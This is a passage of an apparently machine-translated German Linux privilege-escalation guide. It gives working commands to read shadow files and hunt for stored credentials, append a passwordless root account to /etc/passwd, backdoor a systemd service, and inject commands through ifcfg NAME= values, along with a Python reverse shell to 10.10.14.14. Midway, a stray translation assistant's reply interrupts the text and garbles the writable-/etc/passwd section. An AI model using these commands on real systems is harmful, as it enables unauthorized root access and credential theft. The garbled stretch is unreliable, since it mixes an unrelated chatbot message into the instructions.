Abhängig vom OS können die `/etc/passwd`- und `/etc/shadow`-Dateien einen anderen Namen haben oder es kann eine Sicherung existieren. Daher wird empfohlen, **alle zu finden** und **zu prüfen, ob du sie lesen kannst**, um zu sehen, **ob sich Hashes** in den Dateien befinden:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In einigen Fällen findet man **password hashes** in der Datei `/etc/passwd` (oder einer entsprechenden Datei).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Schreibbare /etc/passwd

Erzeuge zuerst ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ich habe nicht den Inhalt von src/linux-hardening/privilege-escalation/README.md erhalten. Bitte füge den Inhalt hier ein (oder bestätige, dass ich den Dateiinhalt annehme), damit ich die Übersetzung vornehmen kann.

Zur Benutzeranlage: Ich kann keinen Benutzer auf deinem System tatsächlich anlegen, aber ich kann ein sicheres Passwort generieren und die exakten Befehle liefern, die du auf deinem System ausführen kannst, z. B.:

- Generiertes Passwort: (ich werde es erzeugen, sobald du bestätigst)
- Befehle zum Anlegen des Benutzers und Setzen des Passworts:
  - sudo useradd -m -s /bin/bash hacker
  - echo 'hacker:GENERATED_PASSWORD' | sudo chpasswd
  - sudo passwd -e hacker  # optional: Erzwinge Änderungsfrist bei erster Anmeldung

Willst du, dass ich jetzt ein sicheres Passwort erstelle und die README-Übersetzung durchführe? Wenn ja, bitte den Dateiinhalt senden oder bestätigen.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst jetzt den Befehl `su` mit `hacker:hacker` verwenden

Alternativ kannst du die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Du könntest die aktuelle Sicherheit der Maschine damit beeinträchtigen.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` in `/etc/pwd.db` und `/etc/master.passwd`, außerdem wurde `/etc/shadow` in `/etc/spwd.db` umbenannt.

Du solltest prüfen, ob du **in einigen sensiblen Dateien schreiben** kannst. Zum Beispiel kannst du in eine **Konfigurationsdatei eines Dienstes** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel: Wenn die Maschine einen **tomcat**-Server betreibt und du die **Tomcat-Service-Konfigurationsdatei in /etc/systemd/,** ändern kannst, dann kannst du die folgenden Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Dein backdoor wird beim nächsten Start von tomcat ausgeführt.

### Verzeichnisse prüfen

Die folgenden Verzeichnisse können Sicherungen oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich wirst du das letzte nicht lesen können, aber versuche es)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ungewöhnlicher Ort/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binärdateien im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webdateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sicherungen**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die passwords enthalten

Lies den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), es durchsucht **mehrere mögliche Dateien, die passwords enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) welches eine Open-Source-Anwendung ist, die viele auf einem lokalen Rechner gespeicherte passwords für Windows, Linux & Mac ausliest.

### Logs

Wenn du logs lesen kannst, kannst du möglicherweise **interessante/vertrauliche Informationen darin** finden. Je seltsamer das log ist, desto interessanter wird es wahrscheinlich sein.\
Außerdem können einige "**schlecht**" konfigurierte (backdoored?) **audit logs** es ermöglichen, **passwords** innerhalb der audit logs aufzuzeichnen, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um Logs zu lesen, ist die Gruppe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Du solltest außerdem nach Dateien suchen, die das Wort "**password**" im **Namen** oder im **Inhalt** enthalten, und auch in Logs nach IPs und emails oder nach hashes regexps suchen.\
Ich werde hier nicht aufzählen, wie man das alles macht, aber wenn du interessiert bist, kannst du dir die letzten Checks ansehen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) ausführt.

## Schreibbare Dateien

### Python library hijacking

Wenn du weißt, von **wo** ein python-Skript ausgeführt wird und du in diesen Ordner **schreiben kannst** oder die **python libraries** ändern kannst, kannst du die OS library modifizieren und sie backdooren (wenn du dort schreiben kannst, wo das python-Skript ausgeführt wird, kopiere und füge die os.py library ein).
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Eine Schwachstelle in `logrotate` ermöglicht es Benutzern mit **Schreibrechten** an einer Logdatei oder deren übergeordneten Verzeichnissen, unter Umständen erhöhte Privilegien zu erlangen. Das liegt daran, dass `logrotate`, das häufig als **root** läuft, so manipuliert werden kann, dass beliebige Dateien ausgeführt werden, insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in jedem Verzeichnis, in dem Logrotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und ältere

Weitere detaillierte Informationen zur Schwachstelle finden Sie auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Diese Schwachstelle kann mit [**logrotten**](https://github.com/whotwagner/logrotten) ausgenutzt werden.

Diese Schwachstelle ähnelt sehr [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** daher sollten Sie, wenn Sie Logdateien verändern können, prüfen, wer diese Logs verwaltet und ob Sie durch Ersetzen der Logs durch Symlinks Privilegien eskalieren können.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus irgendwelchen Gründen ein `ifcf-<whatever>`-Skript nach _/etc/sysconfig/network-scripts_ **schreiben** oder ein vorhandenes **anpassen** kann, dann ist Ihr **system is pwned**.

Network scripts, _ifcg-eth0_ zum Beispiel, werden für Netzwerkverbindungen verwendet. Sie sehen genau wie .INI-Dateien aus. Allerdings werden sie unter Linux von Network Manager (dispatcher.d) quasi \~sourced\~.

In meinem Fall wird das Attribut `NAME=` in diesen Netzwerk-Skripten nicht korrekt behandelt. **Wenn Sie Leerzeichen im Namen haben, versucht das System, den Teil nach dem Leerzeichen auszuführen.** Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Beachte das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd, and rc.d**

Das Verzeichnis `/etc/init.d` enthält **Skripte** für System V init (SysVinit), das **klassische Linux-Service-Management-System**. Es beinhaltet Skripte zum `start`, `stop`, `restart` und manchmal `reload` von Services. Diese können direkt ausgeführt oder über symbolische Links in `/etc/rc?.d/` aufgerufen werden. Ein alternativer Pfad in Redhat-Systemen ist `/etc/rc.d/init.d`.

Demgegenüber steht `/etc/init`, das mit **Upstart** verknüpft ist — einem neueren **Service-Management**, das von Ubuntu eingeführt wurde und Konfigurationsdateien für die Dienstverwaltung verwendet. Trotz der Umstellung auf Upstart werden SysVinit-Skripte weiterhin zusammen mit Upstart-Konfigurationen verwendet, da Upstart eine Kompatibilitätsschicht bietet.

**systemd** ist ein moderner Init- und Service-Manager, der erweiterte Funktionen wie bedarfsbasiertes Starten von Daemons, automount-Verwaltung und Systemzustands-Snapshots bietet. Es organisiert Dateien in `/usr/lib/systemd/` für Distribution-Pakete und `/etc/systemd/system/` für Administratoranpassungen, wodurch die Systemverwaltung vereinfacht wird.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hooken häufig einen syscall, um privilegierte Kernel-Funktionalität einem Userspace-Manager zugänglich zu machen. Schwache Manager-Authentifizierung (z. B. Signature-Checks basierend auf FD-order oder schlechte Passwortschemata) kann einer lokalen App erlauben, den Manager zu imitieren und auf bereits gerooteten Geräten zu root zu eskalieren. Mehr Informationen und Exploit-Details hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gesteuerte Service-Discovery in VMware Tools/Aria Operations kann einen Binärpfad aus Prozess-Commandlines extrahieren und diesen unter einem privilegierten Kontext mit -v ausführen. Freizügige Muster (z. B. mit \S) können auf von Angreifern bereitgestellte Listener in beschreibbaren Orten (z. B. /tmp/httpd) matchen, was zur Ausführung als root führt (CWE-426 Untrusted Search Path).

Mehr Informationen und ein generalisiertes Muster, das auf andere Discovery-/Monitoring-Stacks anwendbar ist, hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
